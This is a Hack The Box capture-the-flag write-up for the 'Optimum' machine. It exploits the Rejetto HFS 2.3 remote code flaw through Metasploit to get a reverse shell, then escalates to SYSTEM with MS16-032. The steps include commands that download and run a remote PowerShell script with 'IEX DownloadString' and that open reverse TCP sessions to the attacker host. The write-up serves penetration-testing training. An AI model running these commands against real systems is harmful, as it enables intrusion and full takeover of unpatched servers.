# HTB Optimum — Writeup
**OS:** Windows Server 2012 R2 (6.3 Build 9600)
**Difficulty:** Easy
**Attack Vector:** CVE-2014-6287 (Rejetto HFS 2.3 RCE)
**Privesc:** MS16-032 Secondary Logon Handle Privilege Escalation
**System:** Arch Linux

---

## Summary

Optimum is a Windows Server 2012 R2 machine running Rejetto HTTP File Server (HFS) 2.3 on port 80. The HFS version is vulnerable to CVE-2014-6287, a remote code execution via null byte injection in the search parameter. Initial shell lands as `kostas`. Privilege escalation to SYSTEM is achieved via MS16-032 (Secondary Logon Handle race condition), using the Empire PowerShell script manually after Metasploit's built-in module failed repeatedly due to 32/64-bit payload issues.

---

## Reconnaissance

### Port Scan
```bash
nmap -sV -Pn -T4 10.129.231.136
```

```
PORT   STATE SERVICE VERSION
80/tcp open  http    HttpFileServer httpd 2.3
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

Only one port open — HTTP on 80 running **HFS 2.3**.

### Web Enumeration

Visiting `http://10.129.231.136/` shows the HFS interface with:
- Server information: **HttpFileServer 2.3**
- Search functionality (the vulnerable parameter)

### Exploit Research
```bash
searchsploit "HFS 2.3"
```

```
Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (2)  | windows/remote/39161.py
```

CVE-2014-6287 — RCE via null byte `%00` in the search parameter, abusing HFS's scripting engine.

---

## Exploitation

### Step 1 — Initial Access via Metasploit

The manual Python exploit required hosting nc.exe and dealing with VBS staging — Metasploit handles it automatically:

```bash
msfconsole -q
use exploit/windows/http/rejetto_hfs_exec
set RHOSTS 10.129.231.136
set RPORT 80
set LHOST 10.10.16.67
run
```

```
[*] Started reverse TCP handler on 10.10.16.67:4444
[*] Sending a malicious request to /
[*] Payload request received: /haQGHQ3wRnIY
[*] Sending stage (190534 bytes) to 10.129.231.136
[*] Meterpreter session 1 opened
```

### Step 2 — User Flag

```bash
shell
whoami
# optimum\kostas
type C:\Users\kostas\Desktop\user.txt
```

### Step 3 — Privilege Escalation Enumeration

Backgrounded the session and ran the local exploit suggester:

```bash
background
use post/multi/recon/local_exploit_suggester
set SESSION 1
run
```

Vulnerable modules found:
- `exploit/windows/local/bypassuac_eventvwr` — requires admin group (kostas is not admin)
- `exploit/windows/local/ms16_032_secondary_logon_handle_privesc` — **viable**
- `exploit/windows/local/tokenmagic` — viable

### Step 4 — MS16-032 (Metasploit Module — Failed)

Attempted multiple times with various configurations:

```bash
use exploit/windows/local/ms16_032_secondary_logon_handle_privesc
set SESSION 1
set LHOST 10.10.16.67
set TARGET 1
set PAYLOAD windows/x64/meterpreter/reverse_tcp
run
```

The exploit executed successfully every time (showed "Holy handle leak Batman, we have a SYSTEM shell!!") but the **payload never connected back**. The PowerShell errors indicated variable reference failures:

```
[ref] cannot be applied to a variable that does not exist.
[!] NtImpersonateThread failed, exiting..
```

Tried: different ports (4444, 5555), migrating to 64-bit process (`explorer.exe` PID 1792), setting TARGET 1 for 64-bit PowerShell — none worked. The Metasploit module's PowerShell script is buggy on this particular target.

### Step 5 — MS16-032 (Manual Empire Script — Worked)

Downloaded the Empire version of the exploit:

```bash
wget https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/privesc/Invoke-MS16032.ps1
```

Appended a command to copy the root flag instead of spawning a reverse shell:

```bash
echo 'Invoke-MS16032 -Command "cmd.exe /c type C:\Users\Administrator\Desktop\root.txt > C:\Users\Public\root.txt"' >> Invoke-MS16032.ps1
```

Hosted the script:

```bash
sudo python3 -m http.server 80
```

From the meterpreter shell on the target:

```bash
shell
powershell -ep bypass "IEX(New-Object Net.WebClient).DownloadString('http://10.10.16.67/Invoke-MS16032.ps1')"
```

```
[!] Holy handle leak Batman, we have a SYSTEM shell!!
```

Then read the root flag:

```cmd
type C:\Users\Public\root.txt
```

---

## Flags

```
User: <submitted>
Root: <submitted>
```

---

## Arch Linux Gotchas & Lessons Learned

| Problem | Fix |
|---|---|
| Manual Python exploit (39161.py) is Python 2 | Run with `python2` or fix `print` statements and `urllib2` → `urllib.request` |
| Manual exploit requires hosting nc.exe | `wget https://github.com/int0x33/nc.exe/raw/master/nc64.exe -O bin/nc.exe` — Arch doesn't have `windows-binaries` package |
| Metasploit ms16_032 module fails silently | PowerShell script has variable reference bugs — use Empire's `Invoke-MS16032.ps1` manually instead |
| Payload port conflict | Initial session uses 4444 — use a different port (5555) for the privesc payload |
| 32-bit vs 64-bit mismatch | Migrate to a 64-bit process (`explorer.exe`) before running 64-bit exploits: `migrate <PID>` |
| `bypassuac_eventvwr` fails | Requires admin group membership — `kostas` is a regular user, so UAC bypass doesn't apply |
| `getsystem` fails | Named pipe impersonation and token duplication all failed — need a kernel exploit |
| `cat` doesn't exist on Windows | Use `type` instead |
| PowerShell prompt doesn't show in meterpreter shell | Shell is working — just type commands and press enter |

---

## Key Takeaway — When Metasploit Modules Fail, Go Manual

The ms16_032 Metasploit module ran the exploit successfully but couldn't deliver the payload. The fix was downloading the raw PowerShell script from Empire and executing it manually with a simpler command (file copy instead of reverse shell). Always have a manual backup plan — especially important for OSCP where Metasploit is limited to one machine.

---

## Tools Used

- `nmap` — reconnaissance and service detection
- `metasploit` (`exploit/windows/http/rejetto_hfs_exec`) — initial access via HFS RCE
- `metasploit` (`post/multi/recon/local_exploit_suggester`) — privesc enumeration
- `Invoke-MS16032.ps1` (Empire) — manual MS16-032 privilege escalation
- `python3 -m http.server` — hosting exploit scripts for target to download

---

*Eight machines down. When the framework breaks, read the script and run it yourself.* 🏆
